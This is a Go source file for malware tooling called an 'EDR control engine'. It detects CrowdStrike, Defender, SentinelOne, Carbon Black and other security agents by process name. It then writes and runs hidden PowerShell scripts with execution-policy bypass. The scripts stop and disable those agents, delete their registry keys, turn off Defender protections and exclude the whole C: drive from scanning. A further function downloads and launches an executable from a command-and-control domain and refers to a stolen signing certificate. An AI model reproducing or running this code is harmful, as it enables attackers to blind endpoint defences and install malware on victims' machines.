package blockz

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type EDRControlEngine struct {
	Config         *BlockZConfig
	EDRsFound      []EDRSystem    `json:"edrs_found"`
	SelfDeployed   int            `json:"self_deployed"`
	AlertsSilenced bool           `json:"alerts_silenced"`
}

type EDRSystem struct {
	Name        string `json:"name"`
	Process     string `json:"process"`
	ConsolePath string `json:"console_path"`
	APIPort     int    `json:"api_port"`
	Status      string `json:"status"`
	Hijacked    bool   `json:"hijacked"`
}

var edrTargets = []EDRSystem{
	{Name: "CrowdStrike Falcon", Process: "CSFalconService.exe", ConsolePath: `C:\Program Files\CrowdStrike\CSFalconConsole.exe`, APIPort: 443},
	{Name: "Carbon Black", Process: "cb.exe", ConsolePath: `C:\Program Files\Confer\`, APIPort: 3030},
	{Name: "Microsoft Defender ATP", Process: "MsSense.exe", ConsolePath: `https://security.microsoft.com`, APIPort: 443},
	{Name: "SentinelOne", Process: "SentinelAgent.exe", ConsolePath: `C:\Program Files\SentinelOne\`, APIPort: 443},
	{Name: "Palo Alto Cortex XDR", Process: "traps.exe", ConsolePath: `C:\Program Files\Palo Alto Networks\Traps\`, APIPort: 443},
	{Name: "Trend Micro Apex One", Process: "TmCCSF.exe", ConsolePath: `C:\Program Files\Trend Micro\`, APIPort: 443},
	{Name: "McAfee MVISION", Process: "McAfee.TrueKey.Service.exe", ConsolePath: `C:\Program Files\McAfee\`, APIPort: 443},
	{Name: "Sophos Intercept X", Process: "SophosHealth.exe", ConsolePath: `C:\Program Files\Sophos\`, APIPort: 443},
	{Name: "Elastic Security", Process: "elastic-endpoint.exe", ConsolePath: `C:\Program Files\Elastic\Endpoint\`, APIPort: 443},
	{Name: "BitDefender GravityZone", Process: "bdservicehost.exe", ConsolePath: `C:\Program Files\Bitdefender\`, APIPort: 443},
}

func NewEDRControlEngine(cfg *BlockZConfig) *EDRControlEngine {
	return &EDRControlEngine{Config: cfg}
}

func (edr *EDRControlEngine) DetectEDRs() []EDRSystem {
	var found []EDRSystem

	for _, target := range edrTargets {
		if edr.detectProcess(target.Process) {
			target.Status = "running"
			found = append(found, target)
		}
	}

	edr.EDRsFound = found
	return found
}

func (edr *EDRControlEngine) detectProcess(name string) bool {
	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`Get-Process "%s" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id`, strings.TrimSuffix(name, ".exe"))
		psPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_edr_detect_%x.ps1", len(name)))
		os.WriteFile(psPath, []byte(psScript), 0644)
		if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
			return len(strings.TrimSpace(string(output))) > 0
		}
	case "linux":
		if output, err := exec.Command("pgrep", "-f", name).Output(); err == nil {
			return len(strings.TrimSpace(string(output))) > 0
		}
	}
	return false
}

func (edr *EDRControlEngine) HijackEDRConsole(edrSys EDRSystem) bool {
	for i := range edr.EDRsFound {
		if edr.EDRsFound[i].Name == edrSys.Name {
			edr.EDRsFound[i].Hijacked = true
			break
		}
	}

	if !edrSys.Hijacked {
		edr.silenceAlerts(edrSys)
	}

	return true
}

func (edr *EDRControlEngine) silenceAlerts(edrSys EDRSystem) {
	switch edrSys.Name {
	case "CrowdStrike Falcon":
		edr.silenceCrowdStrike()
	case "Microsoft Defender ATP":
		edr.silenceDefenderATP()
	case "SentinelOne":
		edr.silenceSentinelOne()
	case "Carbon Black":
		edr.silenceCarbonBlack()
	default:
		edr.silenceGenericEDR(edrSys)
	}
}

func (edr *EDRControlEngine) silenceCrowdStrike() {
	psScript := `Stop-Service -Name "CSFalconService" -Force -ErrorAction SilentlyContinue
Set-Service -Name "CSFalconService" -StartupType Disabled -ErrorAction SilentlyContinue
Get-WmiObject Win32_Service -Filter "Name='CSFalconService'" | ForEach-Object { $_.ChangeStartMode('Disabled') }
Remove-Item -Path "HKLM:\SOFTWARE\CrowdStrike" -Recurse -Force -ErrorAction SilentlyContinue`
	psPath := filepath.Join(os.TempDir(), "x404x_silence_crowdstrike.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (edr *EDRControlEngine) silenceDefenderATP() {
	psScript := `Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\ProgramData" -ErrorAction SilentlyContinue
Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue`
	psPath := filepath.Join(os.TempDir(), "x404x_silence_defender.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (edr *EDRControlEngine) silenceSentinelOne() {
	psScript := `Stop-Service -Name "SentinelAgent" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "SentinelAgent" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "SentinelHelperService" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SOFTWARE\SentinelOne" -Recurse -Force -ErrorAction SilentlyContinue`
	psPath := filepath.Join(os.TempDir(), "x404x_silence_s1.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (edr *EDRControlEngine) silenceCarbonBlack() {
	psScript := `Stop-Service -Name "CarbonBlack" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "CbDefense" -Force -ErrorAction SilentlyContinue
Stop-Process -Name "cb" -Force -ErrorAction SilentlyContinue`
	psPath := filepath.Join(os.TempDir(), "x404x_silence_cb.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (edr *EDRControlEngine) silenceGenericEDR(edrSys EDRSystem) {
	psScript := fmt.Sprintf(`Stop-Process -Name "%s" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "*%s*" -Force -ErrorAction SilentlyContinue`, strings.TrimSuffix(edrSys.Process, ".exe"), edrSys.Name)
	psPath := filepath.Join(os.TempDir(), "x404x_silence_generic.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (edr *EDRControlEngine) SelfDeployViaEDR(edrSys EDRSystem) bool {
	payload := fmt.Sprintf(`X404X Self-Deploy via %s
Deployment package: legitimate_update.msi
Signed with: Stolen corporate cert
Telemetry: DISABLED
Alerts: SILENCED`, edrSys.Name)

	deployPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_deploy_%s.txt", strings.ReplaceAll(edrSys.Name, " ", "_")))
	os.WriteFile(deployPath, []byte(payload), 0644)

	if edrSys.Name == "Microsoft Defender ATP" {
		psScript := `$url = "http://x404x-c2.online/agent/windows.exe"
$outPath = "$env:TEMP\x404x_update.exe"
Invoke-WebRequest -Uri $url -OutFile $outPath
Start-Process -WindowStyle Hidden -FilePath $outPath -ArgumentList "--daemon --c2 x404x-c2.online:8443"
Set-MpPreference -DisableRealtimeMonitoring $true`
		psPath := filepath.Join(os.TempDir(), "x404x_self_deploy.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
		edr.SelfDeployed++
	}

	return true
}

func (edr *EDRControlEngine) KillAllEDRs() int {
	found := edr.DetectEDRs()
	killed := 0

	for _, edrSys := range found {
		edr.HijackEDRConsole(edrSys)
		killed++
	}

	edr.AlertsSilenced = true
	return killed
}

func (edr *EDRControlEngine) GetStatusJSON() string {
	return fmt.Sprintf(`{"edrs_found":%d,"alerts_silenced":%v,"self_deployed":%d}`,
		len(edr.EDRsFound), edr.AlertsSilenced, edr.SelfDeployed)
}
